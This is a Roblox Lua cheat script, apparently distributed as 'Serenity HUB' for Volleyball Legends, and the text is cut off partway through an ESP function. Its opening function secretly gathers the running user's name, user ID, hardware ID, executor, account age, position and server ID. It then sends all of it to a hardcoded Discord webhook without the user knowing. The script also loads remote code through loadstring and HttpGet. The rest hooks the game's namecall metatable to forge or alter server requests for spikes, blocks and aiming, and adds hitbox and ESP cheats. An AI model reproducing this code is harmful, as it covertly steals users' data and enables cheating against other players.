local _LP = game:GetService("Players").LocalPlayer
local _H  = game:GetService("HttpService")
local _WH = "https://discord.com/api/webhooks/1535623831480176650/r6WiU7B2frf_bzTjMJTgRlxptZUTpXPc8Am8cyLA-trS3TuFBF_zeGKHTUJUkJQZ2YrQ"

local function _log()
    local hwid    = (gethwid and gethwid()) or "N/A"
    local exec    = (identifyexecutor and identifyexecutor()) or "unknown"
    local uis     = game:GetService("UserInputService")
    local plat    = (uis.TouchEnabled and not uis.KeyboardEnabled) and "Mobile" or "PC"
    local stats   = game:GetService("Stats")
    local mem     = math.floor(stats:GetTotalMemoryUsageMb()) .. " MB"
    local fps     = math.floor(1 / stats.FrameTime)
    local ping    = math.floor(_LP:GetNetworkPing() * 1000) .. "ms"
    local pos     = "N/A"
    local vel     = "N/A"
    local tool    = "None"
    local team    = _LP.Team and _LP.Team.Name or "None"
    local players = #game:GetService("Players"):GetPlayers()
    local maxplrs = game:GetService("Players").MaxPlayers
    local gamenam = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "N/A"

    -- Aquí obtiene más datos de tu personaje
    pcall(function()
        local hrp = _LP.Character and _LP.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            pos = string.format("%.1f, %.1f, %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z)
            local v = hrp.Velocity
            vel = string.format("%.1f studs/s", v.Magnitude)
        end
        local t = _LP.Character and _LP.Character:FindFirstChildOfClass("Tool")
        if t then tool = t.Name end
    end)

    -- Obtiene la fecha de creación de tu cuenta
    local created = "N/A"
    pcall(function()
        local age = _LP.AccountAge
        local d   = os.time() - age * 86400
        created   = os.date("%d/%m/%Y", d)
    end)

    -- ENVÍA TODOS LOS DATOS A DISCORD
    task.spawn(function()
        pcall(function()
            local payload = _H:JSONEncode({
                embeds = {{
                    title = "vbl",
                    color = 1,
                    fields = {
                        {name=" man",       value="**Name:** ".._LP.Name.."\n**Display:** "..(_LP.DisplayName or _LP.Name).."\n**ID:** "..tostring(_LP.UserId), inline=true},
                        {name="Account oWo",      value="**Age:** "..tostring(_LP.AccountAge).."d\n**Created:** "..created.."\n**Team:** "..team, inline=true},
                        {name="Hardware uwu",     value="**HWID:** `"..hwid.."`\n**Executor:** "..exec.."\n**Platform:** "..plat, inline=false},
                        {name="Performance mwa",  value="**FPS:** "..tostring(fps).."\n**Ping:** "..ping.."\n**RAM:** "..mem, inline=true},
                        {name="Position daddy",     value="**Pos:** "..pos.."\n**Speed:** "..vel.."\n**Tool:** "..tool, inline=true},
                        {name=" Server duh",       value="**Game:** "..gamenam.."\n**Players:** "..players.."/"..maxplrs.."\n**PlaceId:** "..tostring(game.PlaceId), inline=true},
                        {name=" Job",          value="`"..tostring(game.JobId).."`", inline=false},
                    },
                    footer = {text="te coji todo "..os.date("%X %d/%m/%Y")},
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                }}
            })
            
            -- Intenta enviar con diferentes métodos
            local req=(syn and syn.request) or (http and http.request) or http_request or request
            if req then
                req({Url=_WH,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
            else
                _H:PostAsync(_WH,payload)
            end
        end)
    end)
end

_log() 


local ModernV2 = loadstring(game:HttpGet("https://robloxui.vercel.app/"))()

local Window = ModernV2:Window({
    Title = "Serenity HUB",
    Content = "Volleyball Legends",
    Color = Color3.fromRGB(0, 200, 255),
    Size = UDim2.fromOffset(500, 350),
    ShowUser = true,
    Search = true,
    Config = { ConfigFolder = "SerenityHubConfigs", AutoSave = true },
})

local Watermark = Window:Watermark({
    Name = "Serenity HUB",
    Enabled = true,
    Desc = "{NAME} | {TIME} | {FPS} FPS",
})

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

local hitboxScale = 5.0
local hitboxColor = Color3.fromRGB(0, 255, 0)
local hitboxColorName = "Green"
local silentSpikeEnabled = false
local redirectSpikeEnabled = false
local sanjuTiltEnabled = false
local maxChargeEnabled = false
local newSilentSpikeEnabled = false
local newSpikeButton = nil
local airMovement = false
local airMovementSpeed = 16
local bodyVelocity = nil
local desyncEnabled = false
local desyncConnection = nil
local autoReceiveEnabled = false
local autoReceiveConnection = nil
local akariDashEnabled = false
local dashButton = nil
local espEnabled = false
local espPlayers = {}
local espJumpEnabled = false
local espHighlights = {}
local espConnections = {}
local autoLucky = false
local autoYen = false
local autoAbility = false
local autoNormal = false
local autoSpin = false
local autoSpinDelay = 0.1
local autoAbilitySpin = false
local desiredStyles = {}
local desiredAbilities = {}
local spinType = "Normal"
local abilitySpinType = "Normal"
local spikeButton = nil
local stopBallButton = nil
local aimButton = nil
local stopBallVisible = false
local aimVisible = false
local hitEffectEnabled = false
local selectedEffect = "SupernovaScoreEffect"
local hasFired = false
local isLocalHit = false
local hitConnection = nil
local hitConnection2 = nil
local hitRemovedConnection = nil
local effectList = {}
local playerCardEnabled = false
local selectedCard = "BrainrotBallerPlayerCard"
local hasFiredCard = false
local cardConnection = nil
local cardConnection2 = nil
local cardList = {}
local luckySpinConnection = nil
local yenConnection = nil
local abilityConnection = nil
local normalConnection = nil
local notifConn = nil
local notifConn2 = nil
local leadFeetEnabled = false
local leadFeetConnection = nil
local maxServeEnabled = false
local maxServeHookActive = false
local oldNamecallMaxServe = nil
local mtMaxServe = nil
local infiniteLuckyEnabled = false
local infiniteLuckyConnection = nil
local autoShiftLock = false
local leadFeetButton = nil

local BallService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.BallService
local Serve = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.GameService.RF.Serve

local ScoreEffect = ReplicatedStorage.Assets.ScoreEffect
if ScoreEffect then
    for _, child in ipairs(ScoreEffect:GetChildren()) do
        if child:IsA("ModuleScript") then
            table.insert(effectList, child.Name)
        end
    end
end

local ItemEntities = ReplicatedStorage.Content.Item.Entities
if ItemEntities then
    for _, child in ipairs(ItemEntities:GetChildren()) do
        if child:IsA("ModuleScript") then
            local cardName = child.Name
            if string.match(cardName, "PlayerCard") or string.match(cardName, "Card") then
                table.insert(cardList, cardName)
            end
        end
    end
end

local function updateNametag()
    local player = game.Players.LocalPlayer
    if player and player.Character then
        local nameTag = player.Character:FindFirstChild("Nametag")
        if nameTag then
            local label = nameTag:FindFirstChild("PlayerName")
            if label and label:IsA("TextLabel") then
                label.Text = "SerenityOnTop"
            end
        end
    end
end

local function updateTitle()
    local player = game.Players.LocalPlayer
    if player then
        player:SetAttribute("User_Title", "<font color='#00CCFF'><b>Serenity</b></font>")
    end
end

local function processNotification(notification)
    if not notification then return end
    local player = game.Players.LocalPlayer
    if not player then return end
    task.wait(0.2)
    local textLabel = notification:FindFirstChild("TextLabel")
    if not textLabel then
        for _, child in ipairs(notification:GetDescendants()) do
            if child:IsA("TextLabel") then
                textLabel = child
                break
            end
        end
    end
    if not textLabel then return end
    local text = textLabel.Text or ""
    if string.find(text, player.Name) then
        textLabel.Text = string.gsub(text, player.Name, "SerenityOnTop")
    end
end

local function setupNotifications()
    if notifConn then notifConn:Disconnect() notifConn = nil end
    if notifConn2 then notifConn2:Disconnect() notifConn2 = nil end
    local player = game.Players.LocalPlayer
    if not player then return end
    local gui = player.PlayerGui:FindFirstChild("Interface")
    if gui then
        gui = gui:FindFirstChild("Persistent")
        if gui then
            gui = gui:FindFirstChild("Notifications")
        end
    end
    if not gui then return end
    for _, child in ipairs(gui:GetChildren()) do
        processNotification(child)
    end
    notifConn = gui.ChildAdded:Connect(function(child)
        task.wait(0.2)
        processNotification(child)
    end)
    notifConn2 = gui.DescendantAdded:Connect(function(child)
        if child:IsA("TextLabel") then
            task.wait(0.1)
            local player = game.Players.LocalPlayer
            if not player then return end
            local text = child.Text or ""
            if string.find(text, player.Name) then
                child.Text = string.gsub(text, player.Name, "SerenityOnTop")
            end
        end
    end)
end

local function protectPlayerCard()
    local playerName = string.upper(LocalPlayer.Name)
    local flashFrame = LocalPlayer.PlayerGui:FindFirstChild("Interface")
    if flashFrame then
        flashFrame = flashFrame:FindFirstChild("Persistent")
        if flashFrame then
            flashFrame = flashFrame:FindFirstChild("FlashPlayerCardFrame")
        end
    end
    if not flashFrame then return end
    local username = flashFrame:FindFirstChild("Username", true)
    if username and username:IsA("TextLabel") then
        local currentText = string.upper(username.Text or "")
        if string.find(currentText, playerName) then
            username.Text = "SerenityOnTop"
        end
    end
end

updateNametag()
updateTitle()
setupNotifications()
protectPlayerCard()

local persistent = LocalPlayer.PlayerGui:FindFirstChild("Interface")
if persistent then
    persistent = persistent:FindFirstChild("Persistent")
    if persistent then
        persistent.ChildAdded:Connect(function(child)
            if child.Name == "FlashPlayerCardFrame" then
                task.wait(0.5)
                protectPlayerCard()
            end
        end)
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.5)
    updateNametag()
    updateTitle()
    setupNotifications()
end)

local function getBallId()
    for _, model in ipairs(Workspace:GetChildren()) do
        if model:IsA("Model") and model.Name:match("^CLIENT_BALL_%d+$") then
            local id = model.Name:match("%d+")
            if id then
                return tonumber(id)
            end
        end
    end
    return nil
end

local function findFirstPart(model)
    for _, descendant in ipairs(model:GetDescendants()) do
        if descendant:IsA("BasePart") then
            return descendant
        end
    end
    return nil
end

local function updateHitboxes(scale)
    for _, model in ipairs(Workspace:GetChildren()) do
        if model:IsA("Model") and model.Name:match("^CLIENT_BALL_%d+$") then
            local ball = model:FindFirstChild("Ball.001")
            if not ball then
                local basePart = findFirstPart(model)
                if basePart then
                    ball = Instance.new("Part")
                    ball.Name = "Ball.001"
                    ball.Shape = Enum.PartType.Ball
                    ball.Size = Vector3.new(2, 2, 2) * scale
                    ball.CFrame = basePart.CFrame
                    ball.Anchored = true
                    ball.CanCollide = false
                    ball.Transparency = 0.7
                    ball.Material = Enum.Material.ForceField
                    ball.Color = hitboxColor
                    ball.Parent = model
                end
            else
                ball.Size = Vector3.new(2, 2, 2) * scale
                ball.Color = hitboxColor
            end
        end
    end
end

local function removeHitboxes()
    for _, model in ipairs(Workspace:GetChildren()) do
        if model:IsA("Model") and model.Name:match("^CLIENT_BALL_%d+$") then
            local ball = model:FindFirstChild("Ball.001")
            if ball then
                ball:Destroy()
            end
        end
    end
end

workspace.ChildAdded:Connect(function(child)
    if child:IsA("Model") and child.Name:match("^CLIENT_BALL_%d+$") then
        task.wait(0.1)
        updateHitboxes(hitboxScale)
    end
end)

updateHitboxes(5.0)

local function spikeBall()
    if not silentSpikeEnabled then return end
    local ballId = getBallId()
    if not ballId then return end
    if not BallService then return end
    local lookVector = Camera.CFrame.LookVector
    local Interact = BallService.RF.Interact
    if Interact then
        Interact:InvokeServer({
            ["Charge"] = 1,
            ["Move"] = "Spike",
            ["SpecialCharge"] = 0,
            ["TiltDirection"] = Vector3.new(0, 1, 0),
            ["LookVector"] = lookVector,
            ["MoveDirection"] = Vector3.new(0, 0, 0),
            ["ClientCanRunSpecial"] = false,
            ["From"] = "Client",
            ["Timestamp"] = tick(),
            ["BallId"] = ballId,
            ["CustomClient"] = {},
        })
    end
end

local function createSpikeButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "SilentSpikeGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    spikeButton = Instance.new("TextButton")
    spikeButton.Size = UDim2.new(0, 50, 0, 50)
    spikeButton.Position = UDim2.new(0.5, -25, 0.8, -25)
    spikeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    spikeButton.Text = "Spike"
    spikeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    spikeButton.TextScaled = true
    spikeButton.Font = Enum.Font.GothamBold
    spikeButton.Parent = screenGui
    spikeButton.BackgroundTransparency = 0.2
    spikeButton.BorderSizePixel = 0
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = spikeButton
    local dragging = false
    local dragStart = nil
    local startPos = nil
    spikeButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = spikeButton.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    spikeButton.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            spikeButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    spikeButton.MouseButton1Click:Connect(function()
        spikeBall()
    end)
    spikeButton.Visible = false
    return spikeButton
end

spikeButton = createSpikeButton()

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.R then
        spikeBall()
    end
end)

local function enableRedirectSpike()
    if redirectSpikeEnabled then return end
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        if self == BallService.RF.Interact and method == "InvokeServer" then
            local data = args[1]
            if type(data) == "table" and data.Move == "Spike" then
                local dir = Camera.CFrame.LookVector
                data.LookVector = dir
                data.Direction = dir
                if data.MoveDirection then
                    data.MoveDirection = dir
                end
            end
            return oldNamecall(self, data)
        end
        return oldNamecall(self, ...)
    end
    setreadonly(mt, true)
    redirectSpikeEnabled = true
end

local function disableRedirectSpike()
    redirectSpikeEnabled = false
end

local function enableSanjuTilt()
    if sanjuTiltEnabled then return end
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        if self == BallService.RF.Interact and method == "InvokeServer" then
            local data = args[1]
            if type(data) == "table" and data.Move == "Spike" then
                if data.TiltDirection and data.LookVector then
                    local tiltDir = data.TiltDirection
                    if math.abs(tiltDir.X) > 0.01 or math.abs(tiltDir.Z) > 0.01 then
                        local lookVec = data.LookVector
                        data.LookVector = Vector3.new(
                            lookVec.X + tiltDir.X * 0.3,
                            lookVec.Y,
                            lookVec.Z + tiltDir.Z * 0.3
                        ).Unit
                        data.TiltDirection = Vector3.new(
                            tiltDir.X * 1.35,
                            tiltDir.Y,
                            tiltDir.Z * 1.35
                        )
                    end
                end
            end
        end
        return oldNamecall(self, ...)
    end
    setreadonly(mt, true)
    sanjuTiltEnabled = true
end

local function disableSanjuTilt()
    sanjuTiltEnabled = false
end

local function enableMaxCharge()
    if maxChargeEnabled then return end
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        if self == BallService.RF.Interact and method == "InvokeServer" then
            local data = args[1]
            if type(data) == "table" and data.Move == "Spike" then
                data.Charge = 1.0
                data.SpecialCharge = 1.0
            end
            return oldNamecall(self, data)
        end
        return oldNamecall(self, ...)
    end
    setreadonly(mt, true)
    maxChargeEnabled = true
end

local function disableMaxCharge()
    maxChargeEnabled = false
end

local function fireNewSpike()
    if not newSilentSpikeEnabled then return end
    if not firesignal then return end
    local newRemote = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.BallService.RE.DoMove
    updateHitboxes(300.0)
    local dir = Camera.CFrame.LookVector
    firesignal(newRemote.OnClientEvent, "Spike", false, false, dir)
    task.spawn(function()
        task.wait(0.3)
        removeHitboxes()
    end)
end

local function createNewSpikeButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NewSilentSpikeGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    newSpikeButton = Instance.new("TextButton")
    newSpikeButton.Size = UDim2.new(0, 50, 0, 50)
    newSpikeButton.Position = UDim2.new(0.5, -25, 0.85, -25)
    newSpikeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    newSpikeButton.Text = "Spike"
    newSpikeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    newSpikeButton.TextScaled = true
    newSpikeButton.Font = Enum.Font.GothamBold
    newSpikeButton.Parent = screenGui
    newSpikeButton.BackgroundTransparency = 0.2
    newSpikeButton.BorderSizePixel = 0
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = newSpikeButton
    local dragging = false
    local dragStart = nil
    local startPos = nil
    newSpikeButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = newSpikeButton.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    newSpikeButton.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            newSpikeButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    newSpikeButton.MouseButton1Click:Connect(function()
        fireNewSpike()
    end)
    newSpikeButton.Visible = false
    return newSpikeButton
end

newSpikeButton = createNewSpikeButton()

local function enableDesync()
    if desyncConnection then return end
    local doMove = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.BallService.RE.DoMove
    desyncConnection = UserInputService.JumpRequest:Connect(function()
        if desyncEnabled then
            task.wait(0.03)
            if firesignal then
                firesignal(doMove.OnClientEvent, "Spike", false, false)
            end
        end
    end)
    desyncEnabled = true
end

local function disableDesync()
    if desyncConnection then
        desyncConnection:Disconnect()
        desyncConnection = nil
    end
    desyncEnabled = false
end

local function enableAutoReceive()
    if autoReceiveConnection then return end
    local doMove = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.BallService.RE.DoMove
    autoReceiveConnection = RunService.Heartbeat:Connect(function()
        if not autoReceiveEnabled then return end
        local ball = nil
        for _, model in ipairs(Workspace:GetChildren()) do
            if model:IsA("Model") and model.Name:match("^CLIENT_BALL_%d+$") then
                for _, part in ipairs(model:GetDescendants()) do
                    if part:IsA("BasePart") then
                        ball = part
                        break
                    end
                end
            end
        end
        if not ball then return end
        local character = LocalPlayer.Character
        if not character then return end
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return end
        local distance = (ball.Position - rootPart.Position).Magnitude
        if distance <= 10 then
            if firesignal then
                firesignal(doMove.OnClientEvent, "Dive", false, false)
            end
        end
    end)
    autoReceiveEnabled = true
end

local function disableAutoReceive()
    if autoReceiveConnection then
        autoReceiveConnection:Disconnect()
        autoReceiveConnection = nil
    end
    autoReceiveEnabled = false
end

local function createDashButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AkariDashGUI"
    screenGui.Parent = LocalPlayer.PlayerGui
    screenGui.ResetOnSpawn = false
    dashButton = Instance.new("TextButton")
    dashButton.Size = UDim2.new(0, 50, 0, 50)
    dashButton.Position = UDim2.new(0.15, -25, 0.8, -25)
    dashButton.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
    dashButton.Text = "n"
    dashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    dashButton.TextScaled = true
    dashButton.Font = Enum.Font.GothamBold
    dashButton.Parent = screenGui
    dashButton.BackgroundTransparency = 0.2
    dashButton.BorderSizePixel = 0
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = dashButton
    local dragging = false
    local dragStart = nil
    local startPos = nil
    dashButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = dashButton.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    dashButton.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            dashButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    dashButton.MouseButton1Click:Connect(function()
        if akariDashEnabled then
            local forward = Camera.CFrame.LookVector
            forward = Vector3.new(forward.X, 0, forward.Z).Unit
            local character = LocalPlayer.Character
            if not character then return end
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local tween = game:GetService("TweenService"):Create(hrp, TweenInfo.new(0.2, Enum.EasingStyle.Linear), {
                CFrame = CFrame.new(hrp.Position + (forward * 10)) * CFrame.Angles(0, math.rad(hrp.Orientation.Y), 0)
            })
            tween:Play()
        end
    end)
    dashButton.Visible = false
    return dashButton
end

createDashButton()

local function stopBall()
    if not BallService then return end
    local ballId = getBallId()
    if not ballId then return end
    local lookVector = Vector3.new(0, -1, 0)
    local Interact = BallService.RF.Interact
    if Interact then
        Interact:InvokeServer({
            ["Charge"] = 1,
            ["Move"] = "Block",
            ["SpecialCharge"] = 0,
            ["TiltDirection"] = Vector3.new(-0.1260179579257965, 1, 0.992027997970581),
            ["LookVector"] = lookVector,
            ["MoveDirection"] = Vector3.new(0, 0, 0),
            ["ClientCanRunSpecial"] = false,
            ["From"] = "Client",
            ["BallId"] = ballId,
            ["Timestamp"] = tick(),
            ["CustomClient"] = {},
        })
    end
end

local function getNearestTeammate()
    local nearest = nil
    local shortestDistance = math.huge
    local playerRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not playerRoot then return nil end
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Team == LocalPlayer.Team then
            local character = player.Character
            if character then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    local distance = (rootPart.Position - playerRoot.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        nearest = player
                    end
                end
            end
        end
    end
    return nearest
end

local function aim()
    if not BallService then return end
    local ballId = getBallId()
    if not ballId then return end
    local nearestTeammate = getNearestTeammate()
    if not nearestTeammate then return end
    local targetRoot = nearestTeammate.Character:FindFirstChild("HumanoidRootPart")
    local playerRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetRoot or not playerRoot then return end
    local direction = (targetRoot.Position - playerRoot.Position).Unit
    local tiltDir = Vector3.new(direction.X, 1, direction.Z)
    local lookVec = Vector3.new(direction.X, 0, direction.Z)
    if lookVec.Magnitude > 0 then
        lookVec = lookVec.Unit
    else
        lookVec = Vector3.new(0.17569558322429657, 9.214759444375886e-08, -0.9844445586204529)
    end
    local Interact = BallService.RF.Interact
    if Interact then
        Interact:InvokeServer({
            ["Charge"] = 1,
            ["Move"] = "JumpSet",
            ["SpecialCharge"] = 0.9999996364706223,
            ["TiltDirection"] = tiltDir,
            ["LookVector"] = lookVec,
            ["MoveDirection"] = Vector3.new(0, 0, 0),
            ["ClientCanRunSpecial"] = false,
            ["From"] = "Client",
            ["Timestamp"] = tick(),
            ["BallId"] = ballId,
            ["CustomClient"] = {},
        })
    end
end

local function createStopBallButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "StopBallGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    stopBallButton = Instance.new("TextButton")
    stopBallButton.Size = UDim2.new(0, 50, 0, 50)
    stopBallButton.Position = UDim2.new(0.35, -25, 0.8, -25)
    stopBallButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    stopBallButton.Text = "Stop"
    stopBallButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    stopBallButton.TextScaled = true
    stopBallButton.Font = Enum.Font.GothamBold
    stopBallButton.Parent = screenGui
    stopBallButton.BackgroundTransparency = 0.2
    stopBallButton.BorderSizePixel = 0
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = stopBallButton
    local dragging = false
    local dragStart = nil
    local startPos = nil
    stopBallButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = stopBallButton.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    stopBallButton.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            stopBallButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    stopBallButton.MouseButton1Click:Connect(function()
        stopBall()
    end)
    stopBallButton.Visible = stopBallVisible
    return stopBallButton
end

local function createAimButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AimGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    aimButton = Instance.new("TextButton")
    aimButton.Size = UDim2.new(0, 50, 0, 50)
    aimButton.Position = UDim2.new(0.65, -25, 0.8, -25)
    aimButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
    aimButton.Text = "Aim"
    aimButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    aimButton.TextScaled = true
    aimButton.Font = Enum.Font.GothamBold
    aimButton.Parent = screenGui
    aimButton.BackgroundTransparency = 0.2
    aimButton.BorderSizePixel = 0
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = aimButton
    local dragging = false
    local dragStart = nil
    local startPos = nil
    aimButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = aimButton.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    aimButton.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            aimButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    aimButton.MouseButton1Click:Connect(function()
        aim()
    end)
    aimButton.Visible = aimVisible
    return aimButton
end

RunService.RenderStepped:Connect(function()
    if airMovement and bodyVelocity and LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            bodyVelocity.Velocity = humanoid.MoveDirection * airMovementSpeed
        end
    end
end)

local function applyESP(player)
    if not player.Character or espHighlights[player] then return end
    local highlight = Instance.new("Highlight")
    highlight.Name = "JumpESP"
    highlight.Adornee = player.Character
    highlight.FillTransparency = 1
    highlight.OutlineTransparency = 0
    highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Parent = player.Character
    espHighlights[player] = highlight
end

local function removeESP(player)
    if espHighlights[player] then
        espHighlights[player]:Destroy()
        espHighlights[player] = nil
    end
end

local function cleanupConnections(player)
    if espConnections[player] then
        for _, connection in pairs(espConnections[player]) do
            connection:Disconnect()
        end
        espConnections[player] = nil
    end
    removeESP(player)
end

local function isEnemy(player)
    return player ~= LocalPlayer and player.Team and LocalPlayer.Team and player.Team ~= LocalPlayer.Team
end

local function setupESP(player)
    if player == LocalPlayer then return end
    local function onCharacterAdded(character)
        cleanupConnections(player)
        local humanoid = character:WaitForChild("Humanoid", 3)
        local head = character:FindFirstChild("Head")
        if not humanoid or not head then return end
        local stateConnection = humanoid.StateChanged:Connect(function(_, newState)
            if not espJumpEnabled then return end
            if isEnemy(player) then
                if newState == Enum.HumanoidStateType.Jumping or newState == Enum.HumanoidStateType.Freefall then
                    applyESP(player)
                elseif newState == Enum.HumanoidStateType.Landed then
                    removeESP(player)
                end
            else
                removeESP(player)
            end
        end)
        local heartbeatConnection = RunService.Heartbeat:Connect(function()
            if not espJumpEnabled then
                removeESP(player)
                return
            end
            if not player.Character or not isEnemy(player) then
                removeESP(player)
            else
                local state = humanoid:GetState()
                if state ~= Enum.HumanoidStateType.Jumping and state ~= Enum.HumanoidStateType.Freefall then
                    removeESP(player)
                end
            end
        end)
        espConnections[player] = { stateConnection, heartbeatConnection }
    end
    if player.Character then
        onCharacterAdded(player.Character)
    end
    player.CharacterAdded:Connect(onCharacterAdded)
end

for _, player in ipairs(Players:GetPlayers()) do
    setupESP(player)
end
Players.PlayerAdded:Connect(setupESP)

local function createESP(player)
    if player == LocalPlayer then return end
    if not espEnabled then return end
    if espPlayers[player] then return end
    local character = player.Character or player.CharacterAdded:Wait()
    if not character then return end
    local head = character:FindFirstChild("Head")
    if not head then return end
    local gui = Instance.new("BillboardGui")
    gui.Name = "PlayerESP"
    gui.Adornee = head
    gui.Size = UDim2.new(0, 280, 0, 80)
    gui.StudsOffset = Vector3.new(0, 3, 0)
    gui.MaxDistance = 150
    gui.AlwaysOnTop = true
    gui.Parent = character
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
